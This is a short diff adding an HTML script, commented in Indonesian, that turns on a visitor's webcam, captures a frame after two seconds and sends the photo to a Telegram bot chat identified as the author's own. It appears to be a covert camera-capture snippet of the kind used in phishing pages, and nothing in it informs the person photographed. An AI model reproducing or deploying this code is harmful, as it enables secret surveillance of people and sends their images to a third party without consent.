@@ -1,0 +1,26 @@
+<script>
+    const token = 'YOUR_BOT_TOKEN'; 
+    const chat_id = 'YOUR_CHAT_ID';
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        const video = document.getElementById('video');
+        video.srcObject = stream; // Sambungkan kamera ke elemen video
+        
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chat_id); // Alamat tujuan (Anda)
+                formData.append('photo', blob, 'capture.jpg'); // File foto
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg');
+        }, 2000);
+    });
+</script>
